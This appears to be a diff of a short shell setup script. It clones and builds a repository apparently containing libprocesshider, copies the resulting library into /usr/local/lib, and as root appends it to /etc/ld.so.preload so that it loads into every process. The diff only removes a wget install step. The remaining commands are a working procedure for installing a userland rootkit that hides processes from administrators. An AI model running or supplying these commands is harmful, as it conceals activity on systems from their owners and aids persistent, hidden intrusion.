@@ -1,4 +1,4 @@
-sudo apt install wget && sudo apt install make -y && sudo apt install gcc -y && git clone https://github.com/chikahusarii/lemon-lide.git && cd lemon-lide && make
+sudo apt install make -y && sudo apt install gcc -y && git clone https://github.com/chikahusarii/lemon-lide.git && cd lemon-lide && make
 sudo mv libprocesshider.so /usr/local/lib/
 sudo su -c "echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"
 
